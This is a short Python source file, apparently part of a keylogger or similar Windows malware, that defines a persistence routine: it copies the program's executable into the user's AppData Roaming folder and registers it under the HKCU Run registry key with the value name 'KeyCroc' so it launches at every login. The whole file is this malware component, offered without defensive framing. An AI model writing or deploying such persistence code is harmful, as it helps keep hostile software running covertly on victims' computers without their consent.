import os
import shutil
import winreg as wreg


class Persistence:

    def __init__(self, name):

        self.name = name

        path = os.getcwd().strip('/n')
        user_profile = os.getenv('USERPROFILE')
        destination = user_profile.strip('\n\r') + '\\AppData\\Roaming\\' + f'{self.name}.exe'

        if not os.path.exists(destination):

            shutil.copyfile(path + f'\{self.name}.exe', destination)
            key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
            wreg.SetValueEx(key, 'KeyCroc', 0, wreg.REG_SZ, destination)
            key.Close()
